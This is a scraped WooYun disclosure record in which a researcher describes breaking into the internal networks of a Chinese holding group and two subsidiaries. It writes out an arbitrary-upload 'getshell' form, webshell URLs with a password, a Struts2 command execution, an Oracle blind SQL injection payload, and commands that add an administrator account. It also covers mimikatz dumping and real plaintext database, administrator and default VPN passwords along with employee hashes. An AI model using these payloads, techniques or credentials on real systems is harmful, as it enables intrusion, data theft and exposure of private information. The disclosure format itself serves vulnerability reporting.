{"id": 74146, "wybug_id": "wooyun-2016-0167734", "wybug_title": "五星控股集团内网漫游旗下汇通达/孩子王（内部系统/OA/邮箱/VPN/数据库/服务器）", "wybug_corp": "htd.cn", "wybug_author": "DNS", "wybug_date": "2016-01-06 15:22", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： 暂时涉及五星控股旗下的两个平台农村O2O平台汇通达融资5亿元孩子王，母婴平台 详细说明：  一：外网    外网的切入点暂时找到三个。    1.泛微的OA办公系统---任意上传（孩子王OA,汇通达OA，五星控股OA）    2.boss.htd.cn------post注入（延迟注入）    3.bi.htd.cn（202.102.90.252）-------st2漏洞1.泛微的OA办公系统案例： WooYun: 泛微某系统漏洞集合（不拿shell不是合格的白帽子） 利用代码\n<form method='post' action='http://**.**.**.**/tools/SWFUpload/upload.jsp'  enctype=\"multipart/form-data\" > <input type=\"file\" id=\"file\" name=\"test\" style=\"height:20px;BORDER: #8F908B 1px solid;\"/><button type=submit value=\"getshell\">getshell</button> </form>\n直接任意上传孩子王shell：http://oa.haiziwang.com/config.jsp\n\n五星控股shell:http://oa.fsh.cn/config.jsp\n\n汇通达shell：http://202.102.90.234/js/config.jsp汇通达图下面说，这是内网入口菜刀密码:DNS2.http://202.102.90.252/loginOffportal.action存在ST2命令执行 网站绝对路径： D:\\Program Files\\tomcat6\\webapps\\datacvgbi\\ 运行结果： win-c9lnn15nn2d\\administrator由于网站白名单限制，session限制导致shell无法连接，实际目录下应该存在shell，jspx也无法绕过。3.post注入 http://boss.htd.cn/retrieve/retrievePwd.htm (POST)act=forgetPassword&userid=88952634&mobile=88952634\nParameter: userid (POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: act=forgetPassword&userid=88952634' AND 3697=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(110)||CHR(77)||CHR(71),5) AND 'cJPh'='cJPh&mobile=88952634---web application technology: JSPback-end DBMS: OracleColumns like 'PASS' were found in the following databases:Database: HTD_BOSSTable: T_BASIC_USER[1 column]+----------+| Column   |+----------+| PASSWORD |+----------+Database: HTD_BOSSTable: V_T_HGJ_MEMBER[1 column]+----------+| Column   |+----------+| PASSWORD |+----------+\n延迟注入太慢，跑了部分信息验证。二.内网   1.汇通达    （1）OA切入点在汇通达泛微OA。\n\n获取到web数据库连接文件：\n\nmask 区域\n*****ode**********ot; encoding=&q**********quot; version=&q**********e=\"weaver.interfaces.**********oke-fact**********r.interfaces.datasourc**********pe\" value=\"**********host\" value=&qu**********t;port\" value=**********name\" value=&quo**********uot;user\" val**********ssword\" value=&q**********t;minconn\" val**********t;maxconn\" val**********;/constr**********voke-fac**********ice-poi**********ce=\"weaver.interfaces**********oke-fact**********r.interfaces.datasourc**********t;type\" value=**********st\" value=\"**********t;port\" value=**********t;dbname\" valu**********t;user\" value=**********ssword\" value=&q**********t;minconn\" val**********t;maxconn\" val**********;/constr**********voke-fac**********ice-poi**********=\"weaver.interfaces.**********oke-fact**********r.interfaces.datasourc**********t;type\" value=**********st\" value=\"**********t;port\" value=**********t;dbname\" valu**********t;user\" value=**********ssword\" value=&q**********t;minconn\" val**********t;maxconn\" val**********;/constr**********voke-fac**********ice-poi**********=\"weaver.interfaces.**********oke-fact**********r.interfaces.datasourc**********pe\" value=\"**********host\" value=&qu**********t;port\" value=**********dbname\" value=&**********uot;user\" val**********password\" value**********t;minconn\" val**********t;maxconn\" val**********;/constr**********voke-fac**********ice-poi**********e=\"weaver.interfaces**********oke-fact**********r.interfaces.datasourc**********pe\" value=\"**********st\" value=\"**********t;port\" value=**********name\" value=&quo**********uot;user\" val**********ssword\" value=&q**********t;minconn\" val**********t;maxconn\" val**********;/constr**********voke-fac**********ice-poi**********e=\"weaver.interfaces**********oke-fact**********r.interfaces.datasourc**********pe\" value=\"**********st\" value=\"**********t;port\" value=**********name\" value=&quo**********uot;user\" val**********ssword\" value=&q**********t;minconn\" val**********t;maxconn\" val**********;/constr**********voke-fac**********ice-poi**********ace=\"weaver.interface**********oke-fact**********r.interfaces.datasourc**********t;type\" value=**********host\" value=&qu**********t;port\" value=**********t;dbname\" valu**********t;user\" value=**********password\" value**********t;minconn\" val**********t;maxconn\" val**********;/constr**********voke-fac**********ice-poi**********ce=\"weaver.interfaces**********oke-fact**********r.interfaces.datasourc**********t;type\" value=**********st\" value=\"**********t;port\" value=**********t;dbname\" valu**********t;user\" value=**********ssword\" value=&q**********t;minconn\" val**********t;maxconn\" val**********;/constr**********voke-fac**********ice-poi**********e=\"weaver.interfaces**********oke-fact**********r.interfaces.datasourc**********t;type\" value=**********st\" value=\"**********t;port\" value=**********t;dbname\" valu**********t;user\" value=**********ssword\" value=&q**********t;minconn\" val**********t;maxconn\" val**********;/constr**********voke-fac**********ice-poi**********ce=\"weaver.interface**********oke-fact**********r.interfaces.datasourc**********t;type\" value=**********st\" value=\"**********t;port\" value=**********t;dbname\" valu**********t;user\" value=**********word\" value=&quot**********t;minconn\" val**********t;maxconn\" val**********;/constr**********voke-fac**********ice-poi**********dule********************--&**********cod*****\n\n连接进去数据库获取到汇通达所有员工账户信息\n\n存在4000多\n\n\n\n顺便说下，貌似80%的密码是初始密码1由于是系统权限，直接可以加用户，打算抓取哈希，尝试了几个自己的神器都失败了。激活了guest用户\nnet user guest debug.123! net user guest  /active:yesnet localgroup administrators guest  /add\n通过代理软件，转发软件登陆3389，这里用的LCX转发，其他不行，估计是端口代理。登陆上去，用mimikatz抓取到密码，看图\n\nadministrator   oahtd1234!@#$用这个登陆上去，管理员挂着很多文件共享，数据库直接操作\n\n\n\n这是菜刀链接到其他数据库操作\n\n\n\n通过手机三个公司的泛微数据库文件，拿到几台数据库连接信息mssql可以直接添加用户信息上去开启xp_cmdshell\n\n\n\n\n\n\n\n\n\n<img src=\"/u\n\n\n\n\n\n\n\n\n\n\n\n这是172.16.1.22和192.168.1.82抓取到的密码\n\n\n\n可以直接3389到这里我们已经接触到孩子王的数据库了192.168.1.82就是孩子王的OA数据，孩子王OA前台是linux的。  （2）邮箱，VPN通过分析OA系统用户密码规律，拿到几个邮箱chenyan0326\tA60ED9C9B102B8961785DBBBDDC6A53D\t陈艳tomarry7\t842D8156FBB49A1F357A64D0E8A277F0  葛一枫登陆看图\n\n\n\n公司构架\n\n安全一定要重视\n\n邮件中涉及的敏感信息，客户信息\n\n\n\n\n\n各种钓鱼邮件\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n邮箱的信息太多，通过分析，得出OA初始密码：1邮箱初始密码：000000VPN初始密码：000000尝试登陆VPN\n\n用户为工号  密码000000抱歉测试绑定了一台硬件。VPN直接测试\n\n （3）用友软件\n\n\n\n2.孩子王（1）OA\n\n\n\n数据库连接文件部分\nnstruct class=\"weaver.interfaces.datasource.BaseDataSource\">                <set property=\"type\" value=\"sqlserver2008\" />                <set property=\"host\" value=\"172.16.1.15\" />                <set property=\"port\" value=\"1433\" />                <set property=\"dbname\" value=\"htdecology\" />                <set property=\"user\" value=\"sa\" />                <set property=\"password\" value=\"sqlser123654\" />                <set property=\"minconn\" value=\"10\" />                <set property=\"maxconn\" value=\"50\" />\n(2).邮箱\n\n\n\n\n\n\n\n\n\n3.五星控股总部就不演示外网大同小异内网已经突破进去了数据库部分\ntruct class=\"weaver.interfaces.datasource.BaseDataSource\">                <set property=\"type\" value=\"oracle\" />                <set property=\"host\" value=\"172.16.1.23\" />                <set property=\"port\" value=\"1521\" />                <set property=\"dbname\" value=\"orcl\" />                <set property=\"user\" value=\"cbm\" />                <set property=\"password\" value=\"fsh123!@#\" />                <set property=\"minconn\" value=\"5\" />                <set property=\"maxconn\" value=\"10\" />\n暂时涉及两个公司一个总部网段：193      10      192       172四个网段都能通。孩子王员工2W,汇通达4000，大部分密码是弱口令，总部没看   漏洞证明：  \n\n   修复方案：  1.员工意识问题，弱口令，通用口令2.管理员意识，下线后尽量关闭数据库，系统，禁止记住密码3.线上文件加密传输，口令线下传输4.关注国内安全事件，及时打好补丁   版权声明：转载请注明来源 DNS@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-01-07 12:06 厂商回复： 已经了解漏洞细节，正在整改。谢谢dns同学无偿渗透测试。感谢O(∩_∩)O~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-07 09:42 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1619 漏洞数:231        )\t\t \n  有礼物吧，不匿名了，    \n     2016-01-07 11:01 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:711 漏洞数:73        | root@qisec.com)\t\t \n  @king7 表哥 你是不是上错号了    \n     2016-01-07 11:05 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1619 漏洞数:231        )\t\t \n  @DNS 我TM上这个号发洞啊...    \n     2016-01-07 12:04 |    \t\t汇通达网络有限公司(乌云厂商)\t\t \n  谢谢dns同学    \n     2016-01-08 10:56 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:649 漏洞数:87        | 天涯何处无屌丝)\t\t \n  @DNS 有礼物吗？    \n     2016-01-08 11:15 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:711 漏洞数:73        | root@qisec.com)\t\t \n  @糖剩七颗 满满的大礼包    \n     2016-01-08 11:43 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:649 漏洞数:87        | 天涯何处无屌丝)\t\t \n  @DNS 什么礼包？说一下    \n     2016-01-10 22:38 |    \t\t汇通达网络有限公司(乌云厂商)\t\t \n  别逗了，只是交了个朋友，礼物的事情我正在走公司程序申请中。我们厂商也谢谢各位的帮助，谢谢乌云。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}